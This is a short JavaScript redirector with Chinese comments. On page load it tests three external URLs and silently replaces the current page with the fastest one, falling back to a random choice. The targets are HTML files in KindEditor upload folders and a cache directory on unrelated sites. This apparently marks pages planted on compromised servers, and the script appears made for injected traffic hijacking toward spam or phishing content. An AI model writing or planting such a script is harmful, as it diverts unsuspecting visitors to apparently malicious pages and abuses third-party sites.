(function () {
    'use strict';

    // 3个目标网址
    var domains = [
        "https://yczhiyu.com/runtime/cache/mga9f0518adc4847a49224f1664.html",
        "https://www.zmts2020.com/public/static/kindeditor/attached/file/20261031/20261031185630_60142.html",
        "https://www.blissfulbrides.sg/public/kindeditor/attached/file/20261031/20261031190124_78204.html"
    ];

    // 最长测速时间
    var timeout = 2000;

    var controllers = [];
    var finished = false;

    // 跳转
    function go(url) {
        if (finished) return;
        finished = true;

        // 取消其他测速请求
        controllers.forEach(function (c) {
            try {
                c.abort();
            } catch (e) {}
        });

        // 直接跳转，不保留原访问参数
        location.replace(url);
    }

    // 检测网站响应速度
    function check(url) {
        var controller = new AbortController();
        controllers.push(controller);

        return new Promise(function (resolve, reject) {
            var timer = setTimeout(function () {
                controller.abort();
                reject(new Error('timeout'));
            }, timeout);

            var start = performance.now();

            fetch(url, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                redirect: 'follow',
                signal: controller.signal
            }).then(function () {
                clearTimeout(timer);

                resolve({
                    url: url,
                    speed: performance.now() - start
                });

            }).catch(function (error) {
                clearTimeout(timer);
                reject(error);
            });
        });
    }

    // 同时测速，优先跳转第一个成功响应的网站
    Promise.any(domains.map(check)).then(function (result) {
        go(result.url);

    }).catch(function () {
        // 全部测速失败，随机选择一个备用网址
        var randomIndex = Math.floor(
            Math.random() * domains.length
        );

        go(domains[randomIndex]);
    });

})();
